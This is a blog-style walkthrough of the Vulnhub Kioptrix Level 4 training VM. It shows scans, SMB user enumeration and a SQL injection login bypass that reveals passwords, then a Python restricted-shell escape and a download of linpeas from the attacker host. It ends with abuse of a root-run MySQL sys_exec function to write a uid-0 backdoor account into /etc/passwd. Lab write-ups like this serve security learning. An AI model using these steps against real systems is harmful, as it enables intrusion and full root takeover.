---
title: Vulnhub, Kioptrix, Level 4
date: Thu Aug 15 05:15:04 PM EDT 2024
categories: [PentestNotes]
tags: [sqli,mysql,vulnhub,pyjail,]
---

## About Release

- **Name**: Kioptrix: Level 1.3 (#4)
- **Date release**: 8 Feb 2012
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: [http://www.kioptrix.com/blog/?p=604](http://www.kioptrix.com/blog/?p=604)
## Download

- **Kioptrix4_Hyper_v.rar** (Size: 210 MB)
- **Download**: [http://www.kioptrix.com/dlvm/Kioptrix4_Hyper_v.rar](http://www.kioptrix.com/dlvm/Kioptrix4_Hyper_v.rar)
- **Download (Mirror)**: [https://download.vulnhub.com/kioptrix/Kioptrix4_Hyper_v.rar](https://download.vulnhub.com/kioptrix/Kioptrix4_Hyper_v.rar)

- **Kioptrix4_vmware.rar** (Size: 208 MB)
- **Download**: [http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar](http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar)
- **Download (Mirror)**: [https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar](https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar)
## Description

Again a long delay between VMs, but that cannot be helped. Work, family must come first. Blogs and hobbies are pushed down the list. These things aren’t as easy to make as one may think. Time and some planning must be put into these challenges, to make sure that:

~~1. It’s possible to get root remotely~~ [ Edit: sorry not what I meant ]

1a. It’s possible to remotely compromise the machine

1. Stays within the target audience of this site
2. Must be “realistic” (well kinda…)
3. Should serve as a refresher for me. Be it PHP or MySQL usage etc. Stuff I haven’t done in a while.

I also had lots of troubles exporting this one. So please take the time to read my comments at the end of this post.

Keeping in the spirit of things, this challenge is a bit different than the others but remains in the realm of the easy. Repeating myself I know, but things must always be made clear: These VMs are for the beginner. It’s a place to start.

I’d would love to code some small custom application for people to exploit. But I’m an administrator not a coder. It would take too much time to learn/code such an application. Not saying I’ll never try doing one, but I wouldn’t hold my breath. If someone wants more difficult challenges, I’m sure the Inter-tubes holds them somewhere. Or you can always enroll in Offsec’s PWB course. _*shameless plug_

-- A few things I must say. I made this image using a new platform. Hoping everything works but I can’t test for everything. Initially the VM had troubles getting an IP on boot-up. For some reason the NIC wouldn’t go up and the machine was left with the loopback interface. I hope that I fixed the problem. Don’t be surprised if it takes a little moment for this one to boot up. It’s trying to get an IP. Be a bit patient. Someone that tested the image for me also reported the VM hung once powered on. Upon restart all was fine. Just one person reported this, so hoping it’s not a major issue. If you plan on running this on vmFusion, you may need to convert the imagine to suit your fusion version.

-- Also adding the VHD file for download, for those using Hyper-V. You guys may need to change the network adapter to “Legacy Network Adapter”. I’ve test the file and this one seems to run fine for me… If you’re having problems, or it’s not working for any reason email comms[=]kioptrix.com

Thanks to @shai_saint from www.n00bpentesting.com for the much needed testing with various VM solutions.

Thanks to Patrick from Hackfest.ca for also running the VM and reporting a few issues. And Swappage & @Tallenz for doing the same. All help is appreciated guys

So I hope you enjoy this one.

The Kioptrix Team

Source: [http://www.kioptrix.com/blog/?p=604](http://www.kioptrix.com/blog/?p=604)

**Note: Just a virtual hard drive. You'll need to create a new virtual machine & attach the existing hard drive**
## Recon

```bash
└─$ ip -4 -brief address show eth0
eth0             UP             10.0.2.15/24

└─$ sudo netdiscover -P -i eth0 -r 10.0.2.0/24 | tee netdiscover.log
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:3b:ba:ee      1      60  PCS Systemtechnik GmbH
 10.0.2.22       08:00:27:24:69:20      1      60  PCS Systemtechnik GmbH

-- Active scan completed, 4 Hosts found.
```

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.22:139
Open 10.0.2.22:445
Open 10.0.2.22:22
Open 10.0.2.22:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.0.2.22
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-23 09:13 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:13
Completed NSE at 09:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:13
Completed NSE at 09:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:13
Completed NSE at 09:13, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 09:13
Completed Parallel DNS resolution of 1 host. at 09:13, 0.04s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:13
Scanning 10.0.2.22 [4 ports]
Discovered open port 80/tcp on 10.0.2.22
Discovered open port 139/tcp on 10.0.2.22
Discovered open port 22/tcp on 10.0.2.22
Discovered open port 445/tcp on 10.0.2.22
Completed Connect Scan at 09:13, 0.00s elapsed (4 total ports)
Initiating Service scan at 09:13
Scanning 4 services on 10.0.2.22
Completed Service scan at 09:13, 11.02s elapsed (4 services on 1 host)
NSE: Script scanning 10.0.2.22.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:13
Completed NSE at 09:14, 15.60s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
Nmap scan report for 10.0.2.22
Host is up, received user-set (0.0012s latency).
Scanned at 2024-07-23 09:13:46 UTC for 27s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9bad4ff21ec5f23914b9d3a00be84171 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJQxDWMK4xxdEEdMA0YQLblzXV5xx6slDUANQmyouzmobMxTcImV1OfY9vB2LUjJwSbtuPn/Ef7LCik29SLab6FD59QsJKz3tOfX1UZJ9FeoxPhoVsfk+LDM4FbQxo0pPYhlQadVHAicjUnONl5WaaUEYuelAoU36v2wOKKDe+kRAAAAFQDAmqYNY1Ou7o5qEfZx0e9+XNUJ2QAAAIAt6puNENxfFnl74pmuKgeQaZQCsPnZlSyTODcP961mwFvTMHWD4pQsg0j6GlPUZrXUCmeTcNqbUQQHei6l8U1zMO4xFYxVz2kkGhbQAa/FGd1r3TqKXu+jQxTmp7xvNBVHoT3rKPqcd12qtweTjlYKlcHgW5XL3mR1Nw91JrhMlAAAAIAWHQLIOjwyAFvUhjGqEVK1Y0QoCoNLGEFd+wcrMLjpZEz7/Ay9IhyuBuRbeR/TxjitcUX6CC58cF5KoyhyQytFH17ZMpegb9x29mQiAg4wK1MGOi9D8OU1cW/COd/E8LvrNLxMFllatLVscw/WXXTi8fFmOEzkGsaRKC6NiQhDlg==
|   2048 8540c6d541260534adf86ef2a76b4f0e (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApA/UX2iq4JYXncTEDfBoyJWguuDkWDvyw4HlLyc1UBT3Pn2wnYLYa0MjwkBtPilmf5X1zK1z3su7oBEcSEt6o7RzDEUbC1O6nRvY4oSKwBD0qLaIHM1V5CZ+YDtLneY6IriJjHJ0DgNyXalPbQ36VZgu20o9dH8ItDkjlZTxRHPE6RnPiD1aZSLo452LNU3N+/2M/ny7QMvIyPNkcojeZQWS7RRSDa2lEUw1X1ECL6zCMiWC0lhciZf5ieum9MnATTF3dgk4BnCq6dfdEvae0avSypMcs6no2CJ2j9PPoAQ1VWj/WlAZzEbfna9YQ2cx8sW/W/9GfKA5SuLFt1u0iQ==
80/tcp  open  http        syn-ack Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 3.0.28a (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2024-07-23T05:13:57-04:00
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   KIOPTRIX4<00>        Flags: <unique><active>
|   KIOPTRIX4<03>        Flags: <unique><active>
|   KIOPTRIX4<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39102/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12623/tcp): CLEAN (Timeout)
|   Check 3 (port 64918/udp): CLEAN (Failed to receive data)
|   Check 4 (port 59369/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_clock-skew: mean: 1h59m59s, deviation: 2h49m43s, median: -1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:14
Completed NSE at 09:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.55 seconds
```
</details>

{::options parse_block_html="false" /}

```bash
└─$ grep Kio /etc/hosts
10.0.2.22       Kioptrix4.localdomain
```

# SMB 

```bash
└─$ netexec smb 10.0.2.22 -u '' -p '' --shares
SMB         10.0.2.22       445    KIOPTRIX4        [*] Unix (name:KIOPTRIX4) (domain:localdomain) (signing:False) (SMBv1:True)
SMB         10.0.2.22       445    KIOPTRIX4        [+] localdomain\:
SMB         10.0.2.22       445    KIOPTRIX4        [*] Enumerated shares
SMB         10.0.2.22       445    KIOPTRIX4        Share           Permissions     Remark
SMB         10.0.2.22       445    KIOPTRIX4        -----           -----------     ------
SMB         10.0.2.22       445    KIOPTRIX4        print$                          Printer Drivers
SMB         10.0.2.22       445    KIOPTRIX4        IPC$                            IPC Service (Kioptrix4 server (Samba, Ubuntu))
```

```bash
└─$ enum4linux 10.0.2.22 | tee enum4linux.log
...
=========================================( Users on 10.0.2.22 )=========================================
user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''

S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
```

## HTTP (80)

No preview, just login page on webapp.

![Writeup.png](/assets/images/Vulnhub/Kioptrix-Level-4/Writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.22 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.0.2.22
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions             │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       33w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       35w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      114l      702w    53168c http://10.0.2.22/images/cartoon_goat.png
200      GET        1l        9w      109c http://10.0.2.22/checklogin.php
200      GET       45l       94w     1255c http://10.0.2.22/
301      GET        9l       31w      346c http://10.0.2.22/images => http://10.0.2.22/images/
200      GET       45l       94w     1255c http://10.0.2.22/index.php
200      GET       45l       94w     1255c http://10.0.2.22/index
301      GET        9l       31w      344c http://10.0.2.22/john => http://10.0.2.22/john/
302      GET        0l        0w        0c http://10.0.2.22/logout => index.php
302      GET        0l        0w        0c http://10.0.2.22/logout.php => index.php
302      GET        1l       22w      220c http://10.0.2.22/member => index.php
302      GET        1l       22w      220c http://10.0.2.22/member.php => index.php
302      GET        0l        0w        0c http://10.0.2.22/john/john.php => ../index.php
[####################] - 20s    28392/28392   0s      found:22      errors:25
[####################] - 17s    14184/14184   852/s   http://10.0.2.22/
[####################] - 18s    14184/14184   804/s   http://10.0.2.22/cgi-bin/
[####################] - 0s     14184/14184   945600/s http://10.0.2.22/images/ => Directory listing
[####################] - 2s     14184/14184   6080/s  http://10.0.2.22/john/ => Directory listing 
```

I initially tested `'` in only username field and discarded the idea of SQLi, but after some time trying `'` in both username and password leads to SQL injection!

![Writeup-1.png](/assets/images/Vulnhub/Kioptrix-Level-4/Writeup-1.png)

Try logging with valid username from `enum4linux`:

![Writeup-2.png](/assets/images/Vulnhub/Kioptrix-Level-4/Writeup-2.png)

| Username | Password              |
| -------- | --------------------- |
| john     | MyNameIsJohn          |
| robert   | ADGAdsafdfwt4gadfga== |


## SSH (22)

```bash
└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss john@10.0.2.22

└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss robert@10.0.2.22
```

We are able to login as both users, but none of them can do `sudo -l`

Looks like we are somewhat restricted to shell usage?
```bash
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  dont screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$ cd /var/www/html
*** forbidden path -> "/var/www/html"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
```

## Restricted Shell

Shell is restricting access to binaries too
```
robert:~$ cat .lhistory
*** unknown command: cat
```

Available commands:
```bash
robert:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

Allowed path?
```bash
robert:~$ lpath
Allowed:
 /home/robert
```

```bash
john:~$ echo $PATH
*** forbidden path -> "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ echo $SHELL
*** forbidden path -> "/bin/kshell"
...
robert:~$ echo (
sh: Syntax error: end of file unexpected (expecting ")")
```

`Syntax error`? Python?

Yes!
```bash
robert:~$ echo help()

Welcome to Python 2.5!  This is the online help utility.

If this is your first time using Python, you should definitely check out
the tutorial on the Internet at http://www.python.org/doc/tut/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, or topics, type "modules",
"keywords", or "topics".  Each module also comes with a one-line summary
of what it does; to list the modules whose summaries contain a given word
such as "spam", type "modules spam".
```

> **Note**: Later I found [lshell](https://www.aldeid.com/wiki/Lshell) escape, two programs are similar.
{: .prompt-info }

## Escape Restricted Shell

```bash
robert:~$ echo os.system('id')
uid=1002(robert) gid=1002(robert) groups=1002(robert)
sh: Syntax error: "(" unexpected
robert:~$ echo os.system('bash')
robert@Kioptrix4:~$ id
uid=1002(robert) gid=1002(robert) groups=1002(robert)
robert@Kioptrix4:~$ export TERM=rxvt # <-- Normilize shell environment
```

Good, we were able to escape the jail via `os` module.

## Privilege Escalation

Still both users can't access `sudo -l`

suid binaries:
```bash
robert@Kioptrix4:~$ find / -perm -4000 2>/dev/null
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/arping
/usr/bin/gpasswd
/usr/bin/mtr
/usr/bin/passwd
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd
/lib/dhcp3-client/call-dhclient-script
/bin/mount
/bin/ping6
/bin/fusermount
/bin/su
/bin/ping
/bin/umount
/sbin/umount.cifs
/sbin/mount.cifs
```

I wanted to enumerate system via linpeas, but `curl` wasn't available and `wget` didn't like connecting to port 80. After running Python simple http server on 443 port we are able to smuggle the file:
```bash
robert@Kioptrix4:~$ wget 10.0.2.15/lp.sh
--07:09:44--  http://10.0.2.15/lp.sh
           => 'lp.sh'
Connecting to 10.0.2.15:80... failed: Connection timed out.
Retrying.

--07:12:54--  http://10.0.2.15/lp.sh
  (try: 2) => 'lp.sh'

robert@Kioptrix4:~$ wget http://10.0.2.15:443/lp.sh
--07:16:52--  http://10.0.2.15:443/lp.sh
           => 'lp.sh'
Connecting to 10.0.2.15:443... connected.
```

```bash
robert@Kioptrix4:~$ sh lp.sh | tee lp.log
...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009
User & Groups: uid=1002(robert) gid=1002(robert) groups=1002(robert)
Hostname: Kioptrix4
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/netcat is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
...
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
...
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.6.9p10
...
╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] do_pages_move
      Alt: sieve       CVE-2010-0415
      Source: Spenders Enlightenment
  [5] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [6] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [8] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [9] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [10] pipe.c_32bit
      CVE-2009-3547
      Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c
  [11] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [12] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [13] sock_sendpage
      Alt: wunderbar_emporium       CVE-2009-2692
      Source: http://www.exploit-db.com/exploits/9435
  [14] sock_sendpage2
      Alt: proto_ops       CVE-2009-2692
      Source: http://www.exploit-db.com/exploits/9436
  [15] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024
  [16] vmsplice1
      Alt: jessica biel       CVE-2008-0600
      Source: http://www.exploit-db.com/exploits/5092
  [17] vmsplice2
      Alt: diane_lane       CVE-2008-0600
      Source: http://www.exploit-db.com/exploits/5093
...
╔══════════╣ Searching mysql credentials and exec
Found lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so. lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
Found lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so. lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
From '/etc/mysql/my.cnf' Mysql user: user               = root
Found readable /etc/mysql/my.cnf
...
```

The sudo version is really old, I thought there would be exploit for it but soon I gave up and focuses on mysql.
### MySQL

Service is running as root and root account doesn't have password. The connection params could have been found in `/var/www/*.php` scripts like:
```php
robert@Kioptrix4:/var/www$ cat checklogin.php
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect");
mysql_select_db("$db_name")or die("cannot select DB");
```

```bash
john@Kioptrix4:~$ ps aux | grep mysql
root      4142  0.0  0.0   1772   528 ?        S    04:51   0:00 /bin/sh /usr/bin/mysqld_safe
root      4184  0.0  0.9 127256 20392 ?        Sl   04:51   0:08 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --
root      4186  0.0  0.0   1700   552 ?        S    04:51   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
john     19464  0.0  0.0   3004   756 pts/1    R+   07:35   0:00 grep mysql
john@Kioptrix4:~$ mysql -u root -p mysql -e 'SELECT sys_eval("id");'
ERROR 1305 (42000) at line 1: FUNCTION mysql.sys_eval does not exist
john@Kioptrix4:~$ mysql -u root -p mysql -e 'SELECT * FROM func;'
Enter password: [BLANK]
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
| sys_exec              |   0 | lib_mysqludf_sys.so | function |
+-----------------------+-----+---------------------+----------+
john@Kioptrix4:~$ mysql -u root -p mysql -e 'SELECT sys_exec("id");'
Enter password:
+----------------+
| sys_exec("id") |
+----------------+
| NULL           |
+----------------+
john@Kioptrix4:~$ mysql -u root -p mysql -e 'SELECT sys_exec("touch /tmp/pwned");'
Enter password: [BLANK]
+------------------------------+
| sys_exec("touch /tmp/pwned") |
+------------------------------+
| NULL                         |
+------------------------------+
john@Kioptrix4:~$ ls /tmp/pwned  -alh
-rw-rw---- 1 root root 0 2024-07-23 07:34 /tmp/pwned
```

```sql
└─$ openssl passwd -6 -salt back door
$6$back$ZEe0NXkJ.MD8pgefaf8ihIknjA5aBcdHra0qz2/784AoQlin/X/qlqsQj2LdqXs55GHAA2PgcjB121eZSuP5I0
---
john@Kioptrix4:~$ mysql -u root -p mysql
Enter password: [BLANK]
...
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
...
mysql> SELECT sys_exec("echo \'pwn:$6$back$ZEe0NXkJ.MD8pgefaf8ihIkn<BcdHra0qz2/784AoQlin/X/qlqsQj2LdqXs55GHAA2PgcjB121eZSuP5I0:0:0:pwn::/bin/bash\' >> /etc/passwd");
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
| sys_exec("echo \'pwn:$6$back$ZEe0NXkJ.MD8pgefaf8ihIkn<BcdHra0qz2/784AoQlin/X/qlqsQj2LdqXs55GHAA2PgcjB121eZSuP5I0:0:0:pwn::/bin/bash\' >> /etc/passwd") |
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
| NULL                                                                                                                                                   |
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.01 sec)
```

### Add Root Account

The authentication was failing, I didn't know why. After reading `/etc/shadow` hashes were `$1$...`, I guess since box is old it couldn't identify `$6$...`

```sql
└─$ openssl passwd -1 -salt back door
$1$back$HsL.g70.9i5ySAaAA..w/1
---
mysql> SELECT sys_exec("echo \'pwn2:$1$back$HsL.g70.9i5ySAaAA..w/1:0:0:pwn::/bin/bash\' >> /etc/passwd");
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
| sys_exec("echo \'pwn:$6$back$ZEe0NXkJ.MD8pgefaf8ihIkn<BcdHra0qz2/784AoQlin/X/qlqsQj2LdqXs55GHAA2PgcjB121eZSuP5I0:0:0:pwn::/bin/bash\' >> /etc/passwd") |
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
| NULL                                                                                                                                                   |
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.01 sec)
---
robert@Kioptrix4:~$ su - pwn2
Password:
Failed to add entry for user pwn2.

No directory, logging in with HOME=/
root@Kioptrix4:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root.txt

```bash
root@Kioptrix4:/# cat /root/congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```